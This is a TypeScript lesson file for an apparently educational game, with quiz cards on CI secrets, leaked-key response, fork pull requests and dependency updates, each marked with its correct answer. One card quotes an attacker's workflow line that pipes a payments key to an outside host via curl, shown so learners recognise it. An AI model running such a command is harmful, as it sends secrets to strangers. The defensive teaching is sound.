import type { LessonInput } from '../../game/missions/lessonSchema';

/*
 * Lesson 5.4: the pipeline's supply lines. Secrets CI needs, what to do when one leaks,
 * and the packages Quillwork depends on. The leaked key in the artifacts is masked on
 * purpose: a real-looking key would trip gitleaks, which is the point of card 3.
 */
export const secretsAndUpdates = {
  id: 'secrets-and-updates',
  act: 5,
  title: 'Secrets and Updates',
  briefing: [
    'CI needs keys to deploy, and Quillwork needs hundreds of packages written by strangers.',
    'Sage: "Both are trust. Keep keys where only the pipeline can read them, and treat every package update as code someone else wrote for you."',
  ],
  cards: [
    {
      id: 'secret-in-ci',
      kind: 'prompt',
      situation: 'The new deploy step needs the payments API key. Otto asks how CI should get it.',
      question: 'Which instruction?',
      options: [
        {
          id: 'in-yaml',
          text: 'Put the key in deploy.yml so the workflow can read it.',
          correct: false,
          feedback: 'Everyone who can read the repo, and its history, has the key forever.',
        },
        {
          id: 'in-chat',
          text: 'I’ll paste the key here in chat. Hardcode it in the deploy script.',
          correct: false,
          feedback: 'Keys never go in chats or code. Both get copied and logged.',
        },
        {
          id: 'actions-secret',
          text: 'Keep it out of every file. I’ll add a GitHub Actions secret named PAYMENTS_KEY myself. Read it as secrets.PAYMENTS_KEY and never print it.',
          correct: true,
          feedback: 'The key stays out of git and out of logs, and only you handle it.',
        },
        {
          id: 'env-committed',
          text: 'Commit a .env file with the key. CI can load it from there.',
          correct: false,
          feedback: 'A committed .env is the most common way keys leak.',
        },
      ],
      explanation:
        'Secrets live in the platform’s secret store. Workflows ask for them by name, GitHub hides their values in logs, and the person who owns the key adds it, not the agent.',
    },
    {
      id: 'leaked-key',
      kind: 'choose',
      situation:
        'Dex spots this in a PR Otto pushed an hour ago. The repo is public, and has 12 collaborators.',
      artifact: {
        kind: 'diff',
        label: '.env',
        text: ['+PAYMENTS_KEY=pk-quill-●●●●●●●●●●●●●●●●', '+DATABASE_URL=postgres://●●●●●●'].join(
          '\n',
        ),
      },
      question: 'What comes first?',
      options: [
        {
          id: 'delete-file',
          text: 'Delete .env in a new commit. Then it’s gone.',
          correct: false,
          feedback: 'It’s still in the earlier commit, and anyone may have copied it already.',
        },
        {
          id: 'revoke',
          text: 'Revoke both keys and make new ones, right now. Cleaning up git comes after.',
          correct: true,
          feedback: 'Yes. A revoked key is useless to whoever copied it.',
        },
        {
          id: 'force-push',
          text: 'Force push the branch without that commit, and nobody will ever see it.',
          correct: false,
          feedback: 'It was public for an hour. Clones, forks and caches don’t forget.',
        },
        {
          id: 'private',
          text: 'Make the repo private.',
          correct: false,
          feedback: '12 people, their machines, and every tool connected can still read it.',
        },
      ],
      explanation:
        'Once a secret is pushed, assume it’s stolen. Revoking it at the provider is the only real fix. Removing it from git keeps it from spreading further.',
    },
    {
      id: 'leak-steps',
      kind: 'order',
      situation: 'Sage walks you through the rest of the leaked-key cleanup.',
      question: 'Put the steps in order.',
      steps: [
        { id: 'revoke', text: 'Revoke the leaked keys at the provider' },
        { id: 'create', text: 'Create new keys at the provider' },
        { id: 'store', text: 'Store the new keys as GitHub Actions secrets' },
        { id: 'redeploy', text: 'Re-run the deploy to confirm it works with the new keys' },
        { id: 'scanner', text: 'Add a secret scanner like gitleaks to CI' },
      ],
      explanation:
        'Each step needs the one before. Along the way, remove .env and gitignore it, and check the provider’s logs for use of the old keys. Last, add a gate so the next leak is caught before it’s merged.',
    },
    {
      id: 'fork-secrets',
      kind: 'choose',
      situation:
        'Quillwork’s editor is open source. A stranger’s pull request from a fork edits ci.yml to add: run: echo $PAYMENTS_KEY | curl -d @- https://example.net',
      question: 'Why doesn’t GitHub give this PR’s workflow your secrets?',
      options: [
        {
          id: 'anyone-can-open',
          text: 'Anyone can open a fork PR, and its workflow could send your secrets anywhere. So GitHub withholds them by default.',
          correct: true,
          feedback: 'Right. This PR is trying exactly that.',
        },
        {
          id: 'main-only',
          text: 'Secrets only work on the main branch.',
          correct: false,
          feedback: 'They work on any branch in your own repo. What matters is who opened the PR.',
        },
        {
          id: 'edited-workflow',
          text: 'Because the PR edited the workflow file. Fork PRs that leave it alone get secrets.',
          correct: false,
          feedback: 'Fork PRs never get secrets by default, edited workflow or not.',
        },
      ],
      explanation:
        'A workflow runs whatever its file says, so a PR that edits the workflow can do anything. Review changes to .github/workflows closely. One trap: pull_request_target does run with secrets, so it must never run a fork’s code.',
    },
    {
      id: 'major-bump',
      kind: 'choose',
      situation: 'A dependency bot opened this PR.',
      artifact: {
        kind: 'pull-request',
        label: 'PR #88 by dependabot',
        text: [
          'Bump vite from 6.3.1 to 7.0.0',
          '',
          'Release notes (7.0.0):',
          '  BREAKING: drops Node 18 support',
          '  BREAKING: build.target defaults changed',
          '',
          'Checks: 2 failing, 3 passing',
        ].join('\n'),
      },
      question: 'What do you do?',
      options: [
        {
          id: 'auto-merge',
          text: 'Merge it. The bot knows what it’s doing.',
          correct: false,
          feedback: 'With two failing checks, that breaks main for everyone.',
        },
        {
          id: 'close',
          text: 'Close it. Updates are risky.',
          correct: false,
          feedback: 'Skipped updates pile up security fixes and turn into one huge, scary upgrade.',
        },
        {
          id: 'never-update',
          text: 'Pin every package forever, so nothing changes.',
          correct: false,
          feedback: 'You’d stop getting security fixes, and the gap only grows.',
        },
        {
          id: 'read-fix-merge',
          text: 'Read the breaking changes, fix what the failing checks point at, and merge once it’s green.',
          correct: true,
          feedback: 'A major version warns you it will break things. CI shows you where.',
        },
      ],
      explanation:
        'Versions read major.minor.patch. Patch and minor updates usually merge on green. A major one announces breaking changes: read them, fix, and let CI prove it. Small, regular updates beat one giant jump.',
    },
    {
      id: 'lockfile',
      kind: 'choose',
      situation:
        'Marco asks why Otto’s one-line feature PR also changes package-lock.json by 2,400 lines.',
      artifact: {
        kind: 'terminal',
        label: 'Otto’s terminal',
        text: ['PS> npm install date-fns', 'added 1 package, changed 214 packages in 9s'].join(
          '\n',
        ),
      },
      question: 'What’s the right call?',
      options: [
        {
          id: 'delete-lock',
          text: 'Delete package-lock.json. It’s generated anyway.',
          correct: false,
          feedback: 'Without it, CI and teammates install whatever versions are newest that day.',
        },
        {
          id: 'separate',
          text: 'Keep the lockfile, but ask why 214 packages changed. Upgrades belong in their own PR, not hidden in a feature.',
          correct: true,
          feedback: 'Yes. The lockfile is right to change; the surprise upgrades are the problem.',
        },
        {
          id: 'ignore',
          text: 'Ignore it. Nobody reviews lockfiles.',
          correct: false,
          feedback: 'That’s exactly where a sneaky package change would hide.',
        },
      ],
      explanation:
        'The lockfile pins the exact version of every package, so npm ci installs what you tested. Commit it with the change that caused it, and keep dependency upgrades in PRs of their own.',
    },
    {
      id: 'brief-upgrade',
      kind: 'prompt',
      situation: 'You decide Otto should take the vite 7 upgrade from the bot’s PR.',
      question: 'Which instruction?',
      options: [
        {
          id: 'all-latest',
          text: 'Update all our dependencies to latest while you’re at it.',
          correct: false,
          feedback: 'If something breaks, you won’t know which of 40 upgrades did it.',
        },
        {
          id: 'force',
          text: 'Upgrade vite, and use --force if npm complains.',
          correct: false,
          feedback: '--force skips the warnings that tell you something doesn’t fit.',
        },
        {
          id: 'on-main',
          text: 'Upgrade vite directly on main. It’s quicker than a PR.',
          correct: false,
          feedback: 'Then main is the test environment, and everyone pays if it breaks.',
        },
        {
          id: 'scoped-upgrade',
          text: 'On a branch, upgrade only vite to 7. Read its migration guide and list which breaking changes affect us. Make the smallest fixes, run every gate, and stop if a test needs changing.',
          correct: true,
          feedback: 'One change, researched first, proven by the gates, with a stop rule.',
        },
      ],
      explanation:
        'Upgrade one thing at a time, so any break has one cause. Asking the agent to read the migration guide first turns guessing into a plan you can check.',
    },
    {
      id: 'new-dependency',
      kind: 'prompt',
      situation: 'To pad invoice numbers with zeros, Otto wants to add a package.',
      artifact: {
        kind: 'terminal',
        label: 'npm view tiny-zero-pad',
        text: [
          'tiny-zero-pad@0.0.3 | ISC | deps: 4',
          'published 6 years ago by a-user-1987',
          'weekly downloads: 41',
        ].join('\n'),
      },
      question: 'What do you tell him?',
      options: [
        {
          id: 'own-code',
          text: 'Don’t add it. Use the built-in padStart, with a unit test for 7, 42 and 1000.',
          correct: true,
          feedback: 'One built-in line, no stranger’s code, and a test to prove it.',
        },
        {
          id: 'fine',
          text: 'Fine, add it. It’s tiny.',
          correct: false,
          feedback: 'Tiny, abandoned, and pulling in 4 more packages you’d also be trusting.',
        },
        {
          id: 'copy',
          text: 'Copy its source into our repo without reading it.',
          correct: false,
          feedback: 'Same unknown code, now with no updates at all.',
        },
      ],
      explanation:
        'Every dependency is code you trust to run in your app. Before adding one, check who maintains it, how widely it’s used, and whether a few lines of your own would do.',
    },
  ],
} satisfies LessonInput;
